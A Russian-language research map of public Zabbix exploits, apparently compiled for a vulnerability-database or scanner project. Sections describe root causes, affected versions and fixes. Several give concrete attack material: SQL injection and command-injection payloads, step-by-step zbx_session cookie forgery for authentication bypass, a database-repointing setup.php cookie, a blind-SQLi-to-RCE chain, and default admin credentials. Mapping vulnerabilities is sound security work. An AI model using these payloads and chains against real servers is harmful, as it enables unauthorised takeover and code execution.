# Zabbix PoC map — конспект механики публичных эксплойтов

Источники: exploit-db (локальный клон gitlab.com/exploit-database/exploitdb), metasploit-framework (локальный клон), vulhub, NVD API, ZBX-тикеты (support.zabbix.com), SonarSource, HackTricks, 0xdf, GitHub-поиск. Все URL — в `pocs.json`.

> Отмечено `[INFERENCE]` — утверждения, прямо не подтверждённые источником, выведенные из смежных данных.

---

## CVE-2016-10134 — SQLi (jsrpc.php / latest.php), Zabbix 2.2.x–3.0.3 → фикс 3.0.4

- **Два вектора**:
  1. `jsrpc.php` параметр `profileIdx2` — error-based ("Duplicate entry" через `COUNT(*) ... GROUP BY`), **работает без аутентификации** (sid в URL не проверяется; EDB 40353 хардкодит `sid=0bcd4ade648214dc`; vulhub — `?type=0&mode=1&method=screen.get&profileIdx=web.item.graph&resourcetype=17&profileIdx2=updatexml(0,concat(0xa,user()),0)`).
  2. `latest.php` параметр `toggle_ids[]` — **stacked query** через `CProfile::insertDB()`: `INSERT INTO profiles (...) VALUES (...); <SQL>` (1n3, EDB 40237, seclists fulldisclosure/Aug/60). Требует сессию (логин или guest).
- Публичные PoC: EDB 40353 (python2), EDB 40237, MSF `auxiliary/gather/zabbix_toggleids_sqli` (bperry; POST `latest.php?output=ajax&sid=...` + `favobj=toggle&toggle_ids[]=348 <sql>&toggle_open_state=0`), vulhub.
- **⇒ RCE-цепочка**: SQLi → sessionid администратора из `zabbix.sessions` → вход → script/API RCE (EDB 39937 «Zabbix API JSON-RPC RCE», packetstorm 137454).

## CVE-2016-10135 — НЕ Zabbix (важно!)

По NVD/cvelist `CVE-2016-10135` — уязвимость **LG MTKLogger** (Android, MTK-чипсеты), CNA `cve@mitre.org`; к Zabbix отношения не имеет. В таск-листе, вероятно, ошибка атрибуции (в ряде устаревших списков 10134/10135 идут парой как «Zabbix SQLi»). Zabbix-инъекция носит только CVE-2016-10134. Маппить 10135 как non-Zabbix; PoC нет.

## CVE-2017-2824 — RCE в trapper Zabbix Server (порт 10051)

- Механика (Talos TALOS-2017-0325, vulhub): сервер выполняет remote command для зарегистрированного хоста, подставляя сохранённый в БД адрес интерфейса хоста в shell-команду (без экранирования).
- PoC (vulhub `exploit.py`, python3):
  1. `{"request":"active checks","host":"vulhub","ip":";touch /tmp/success"}` → TCP 10051 (регистрация через auto-registration; **нужно включённое действие Auto-registration 'Add host'**);
  2. перебор hostid: `{"request":"command","scriptid":1,"hostid":"<id>"}` → при совпадении `;touch /tmp/success` выполняется на сервере от `zabbix`.
- Затронуто: 2.0.x<2.0.21, 2.2.x<2.2.18, 2.4.x, 3.0.x<3.0.9, 3.2.x<3.2.5. В Metasploit модуля нет. (CVE-2017-2825 — соседний DoS, не в скоупе.)

## CVE-2019-17382 — anonymous-доступ к dashboard

- `GET /zabbix.php?action=dashboard.view&dashboardid=1` без учётки → 200 + содержимое дашборда; аноним может создавать Dashboard/Report/Screen/Map (видны всем, включая админа).
- PoC: EDB 47467 (текст+curl), EDB 47474 (perl/LWP). ZBX-16789. Фикс 4.4.1 (Snyk `[,4.4.1)`); в LTS бэкпорт позже (Debian).

## CVE-2022-23131 — SAML SSO authentication bypass (Cookie-форджинг без ключа)

- **Корень**: client-side сессия — кука `zbx_session = base64(JSON)`. `CEncryptedCookieSession::checkSign()` вызывается **только** при извлечении `sessionid` (`extractSessionId()`), а для остальных полей (в т.ч. `saml_data`) — **никогда**. `index_sso.php` при наличии `saml_data` делает `user.loginByUsername($saml_data['username_attribute'], ...)` без проверки подписи (SonarSource).
- **Алгоритм подделки куки (PoC Mr-xn/random-robbie/jweny):**
  1. GET `/` (анонимно) → получить `zbx_session`;
  2. decode → JSON `{"sessionid":"<32hex>","sign":"<hex>"}` (5.0/5.4) / `+serverCheckResult,serverCheckTime` (6.0.0beta);
  3. добавить `"saml_data":{"username_attribute":"Admin"}` (имя жертвы известно заранее), `sessionid`/`sign` **не менять**;
  4. re-encode → GET `/index_sso.php` → вход как Admin.
  Никакого вычисления подписи: `sign` переиспользуется от собственной анонимной куки. `[INFERENCE]` на 6.0.0beta формат с serverCheck-полями (см. PoC 0xdf для 6.4.x — там те же поля).
- Условия: **SAML SSO включён** (не default); знать имя пользователя (Admin); guest — если включён. Фикс: 4.0.37/5.0.19/5.4.9/6.0.0beta2 (коммиты 0395828a, eea1f70a). CISA KEV, активная эксплуатация с 2022.
- Цепочка после байпаса: admin → script/item RCE (CVE-2021-46088, EDB 50816, MSF zabbix_script_exec).

## CVE-2022-23134 — reconfiguration через setup.php (step 6)

- **Корень**: `setup.php` хранит прогресс шагов в той же непроверяемой сессии; `CSetupWizard::stage6()` собирает `conf/zabbix.conf.php` из `getConfig()` (обёртка над `$_SESSION`) и сохраняет файл — подпись куки не проверяется.
- **PoC (TheN00bBuilder):** кука `zbx_session = base64url({"step":"6","default_timezone":"system","DB_TYPE":"MYSQL","DB_SERVER":"<ip>","DB_PORT":3306,"DB_DATABASE":"zabbix","DB_USER":"zabbix","DB_PASSWORD":"..."})`, затем `POST /zabbix/setup.php` (данные `sid`, `form_refresh=1`, `next[5]=Next step`) → фронтенд переписан на БД атакующего → вход с известными учётками → полный доступ. Предусловие: MySQL атакующего со схемой zabbix и юзером (`mysql_native_password` для MySQL 8!).
- Затронуто: 5.4.0–5.4.8rc1, 6.0.0a1–beta1 (NIST); фикс 5.4.9/6.0.0beta2 (коммит 20943ae3). CISA KEV. SonarSource отмечает пространство для развития: `phar://` через `file_exists()` при валидации БД, `LOAD DATA LOCAL` (отключён в новых PHP).

## CVE-2023-32725 — утечка zbx_session через URL-widget (scheduled reports)

- Механика (ZBX-23854, CWE-565, CVSS 9.6/8.8): URL-widget грузит произвольный URL; при тесте/исполнении scheduled report (только Admin/Super admin) сайту-приёмнику уходит `zbx_session` автора отчёта → session hijack → привилегии.
- Затронуто: 6.0.0–6.0.21 (фикс 6.0.22), 6.4.0–6.4.6 (фикс 6.4.7), 7.0.0a1–a3 (фикс a4/a5). PoC-кода нет (атака тривиальна: свой веб-сервер + URL-widget).

## CVE-2024-22116 — RCE через параметры скрипта (Ping) — «Zabbix 7.0.x RCE» #1

- ZBX-25016: отсутствие экранирования параметров скрипта по умолчанию; restricted admin эксплуатирует выполнение скриптов (Ping) в Monitoring→Hosts → arbitrary code. 6.4.9–6.4.15 (фикс 6.4.16rc1), 7.0.0a1–rc3 (фикс 7.0.0rc3). Standalone-PoC нет (правка параметров в UI/API).

## CVE-2024-22117 / 22119 / 22121

- **22117**: Map URL `sysmapelementurlid` — манипуляция последовательности (ID+1) блокирует добавление URL другими (DoS/access control). PoC нет.
- **22119**: stored XSS через поле «Name» на Graph page (invalid validation). PoC нет.
- **22121**: non-admin может менять/удалять функции конфигурации агента (integrity/availability). PoC нет.
- Все три — condition-check для сканера (не эксплойт-класс).

## CVE-2024-22120 — time-based blind SQLi (audit log clientip) → Admin → RCE — «Zabbix 7.0.x RCE» #2

- **Корень**: при `script.execute` запись Audit Log содержит `clientip` (IP подключавшегося) без экранирования → время-зависимая blind SQLi. Атака идёт **по TCP 10051** (протокол trapper, фрейм `ZBXD\x01` + 8-байт LE длина), не через веб (HackTricks/0xdf/ZBX-24505).
- **Шаги (W01fh4cker/CVE-2024-22120-RCE + 0xdf HTB Watcher):**
  1. low-priv/guest сессия → `sessionid` из `zbx_session` (base64), `hostid`, разрешённый `scriptid` (в лабе 1/2, не 3);
  2. на 10051: `{"request":"command","sid":<sid>,"scriptid":"2","hostid":"10084","clientip":"' + (SQL) + '"}`;
  3. SQL: `(select CASE WHEN ascii(substr((select session_key from config),POS,1))=ORD THEN sleep(10) ELSE sleep(1) END)` → вытащить `session_key` (32 hex); затем admin `sessionid` из `sessions where userid=1`;
  4. фордж куки: `sign = HMAC-SHA256(key=session_key, data=JSON(sessionid/serverCheckResult/serverCheckTime, sorted keys, compact))`, `zbx_session = base64(JSON+sign)` → `GET /zabbix.php?action=dashboard.view`;
  5. RCE: `api_jsonrpc.php` `script.create` (`scope:2`) → `script.execute` → global script выполняется на Zabbix Server от `zabbix` (`[INFERENCE]` — детали из кода скриптов тулкита).
- Затронуто: 6.0.0–6.0.27 (фикс 6.0.28), 6.4.0–6.4.12 (фикс 6.4.13), 7.0.0a1–beta1 (фикс beta2). Zabbix ставит high-privileges, NVD — low; права проверять по роли/хосту/скрипту вручную.

## CVE-2024-22122 / 22123 — SMS/GSM медиа

- **22122** (ZBX-25012): AT-командная инъекция через невалидируемое поле «Number» при тесте/отправке SMS → произвольные AT-команды на GSM-модеме. PoC нет.
- **22123**: «GSM modem file» можно указать произвольным файлом (в т.ч. логом): zabbix_server пишет туда AT-команды, лог ломается, часть содержимого утекает в UI (mini arbitrary file-read). PoC нет.

## CVE-2024-42327 — SQLi в API (user.get selectRole) → Admin → RCE — «Zabbix 7.0.x RCE» #3

- **Корень** (ZBX-25623): `CUser::addRelatedObjects` в `CUser.get` не экранирует значения select-полей (`selectRole` и др.); метод доступен **любому** юзеру с API-доступом (роль User по умолчанию) — не admin, в отличие от «скриптового» RCE.
- **PoC**: EDB 52230 (проверка), BridgerAlderson (полная цепочка: user.login → time-based SQLi → admin sessionid → host.get/interface.get → item.create `system.run[reverseshell]`), godylockz (privesc, threads/sleep-time настройки).
- Затронуто: 6.0.0–6.0.31 (фикс 6.0.32), 6.4.0–6.4.16 (фикс 6.4.17), 7.0.0 (фикс 7.0.1). CVSS 9.9. RCE-часть требует доступного хоста и `AllowKey=system.run[*]`.

## CVE-2025-* (smartctl, oauth.authorize, SQLi autoremoval) — PoC нет

- **CVE-2025-27233/27234** (Agent 2 smartctl; HackerOne kelsier / Janis Nulle): плагин `src/go/plugins/smart` не санитизирует параметры `smart.disk.get` → инъекция аргументов в `smartctl`; 27233 — NTLMv2-утечка на Windows (6.0.0–6.0.39 → фикс 6.0.40; 7.0.0–7.0.10 → 7.0.11; 7.2.0–7.2.4 → 7.2.5), 27234 — RCE в 5.0 (5.0.0–5.0.46 → 5.0.47). Workaround: AllowKey/DenyKey. Детали инъекции публично не раскрыты.
- **CVE-2025-27232** (oauth.authorize arbitrary file read; HackerOne o4ncL1, ZBX-27282): Super Admin, crafted HTTP к `oauth.authorize` → LFI веб-сервера; ТОЛЬКО 7.4.0–7.4.2, фикс 7.4.3. Детали не раскрыты.
- **CVE-2025-27240** (ZBX-26986): secondary-order SQLi при autoremoval авто-зарегистрированных хостов через «Visible name».
- **CVE-2025-27236/27238, CVE-2025-49641/49642/49643, CVE-2025-10630** (Grafana-Zabbix ReDoS): info-disclosure/DoS-класс, PoC-кода в открытых источниках нет — в `pocs.json` не включались.

## Смежные reference-инструменты

- **MSF `auxiliary/scanner/http/zabbix_login`** — сканер дефолтных учёток (Admin/zabbix) — полезен для фингерпринта/первичного входа.
- **MSF `exploits/multi/http/zabbix_script_exec`** (CVE-2013-3628) — постаут-RCE (script/item техники), работает до 6.0.0 — см. запись в pocs.json.
- **MSF `exploits/linux/misc/zabbix_server_exec`** (CVE-2009-4498, trapper) и **`exploits/unix/misc/zabbix_agent_exec`** (CVE-2009-4502) — исторические PoC (не в скоупе, референс).
- **Zabbix default creds**: Admin/zabbix (5 фейлов → 30 с блокировки); guest отключён по умолчанию (HackTricks).
- **Формат куки zbx_session (сводно)**: base64(JSON); поля версионно-зависимы: 5.0/5.4 — `sessionid`,`sign`; 6.0+ — `sessionid`,`serverCheckResult`,`serverCheckTime`,`sign`. Подпись: до 5.4.8 — конструкция `CEncryptHelper::sign` (AES-ECB-based, gebruikt как sign); начиная с фикса (5.4.9+/6.0) — HMAC-SHA256(key=`session_key` из `config.session_key`, data=JSON sorted+compact), sign — hex внутри base64(JSON). В 2.x–4.x (pre-5.0) — простая кука `zbx_sessionid` (32 hex). Всегда сверять с кодом фронтенда конкретной версии — эмпирически формат менялся.

## Неоднозначности / открытые вопросы

1. **CVE-2016-10135** — почти наверняка не-Zabbix (см. выше); при желании можно разыскать первоисточник ошибки в трекере, но NVD/cvelist однозначны.
2. **CVE-2022-23131/23134** — точный JSON-формат куки зависит от ветки; PoC-скрипты писались под 5.4.x; для 6.0.0beta добавляются serverCheck-поля ([INFERENCE] по 0xdf/6.4x).
3. **CVE-2024-22120** — разногласие Zabbix (high priv) vs NVD (low priv): как именно «clientip» попадает в audit (IP соединения по 10051) — подтверждено 0xdf.
4. **CVE-2024-22116** точный диапазон 6.0.x — в открытых данных только 6.4.9+/7.0.0a1+; для 6.0.x проверять вручную.
5. **CVE-2025-27232/27233/27234** — публичных PoC нет; при сканировании — только condition-проверки (версия + наличие плагина/функции).
6. Версии фиксов для 22117/22119/22121-22123 не указаны в открытых NVD cpe-записях (диапазоны не заданы) — в записи vuln-БД (peer CveResearch) брать из ZBX-тикетов.
